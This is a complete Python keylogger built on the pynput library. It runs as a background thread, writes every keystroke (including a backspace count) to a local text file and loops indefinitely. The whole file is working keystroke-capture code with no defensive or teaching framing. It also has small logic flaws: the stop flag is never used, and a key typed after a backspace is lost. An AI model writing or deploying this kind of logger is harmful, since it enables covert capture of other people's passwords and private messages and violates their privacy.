from pynput import keyboard
import threading
import time

class Keylogger(threading.Thread):
    def __init__(self):
        super().__init__()
        self._running = True

    def stop(self):
        self._running = False

    def run(self):
        backspace_count = 0

        def on_press(key):
            nonlocal backspace_count  
            try:
                if key == keyboard.Key.enter:
                    key = "\n"
                elif key == keyboard.Key.tab:
                    key = "\t"
                elif key == keyboard.Key.space:
                    key = " "
                elif key == keyboard.Key.shift:
                    key = "[Shift]"
                elif key == keyboard.Key.backspace:
                    backspace_count += 1
                    return  
                elif key == keyboard.Key.esc:
                    key = ""
                elif key == keyboard.Key.ctrl:
                    key = ""
                else:
                    key = key.char
            except AttributeError:
                pass

            with open("key_log.txt", "a") as f:
                if backspace_count > 0:
                    f.write("[Backspaced]*{} ".format(backspace_count))
                    backspace_count = 0
                else:
                    f.write(str(key))

        def on_release(key):
            pass

        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

def main():
    keylogger = Keylogger()
    keylogger.start()

    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
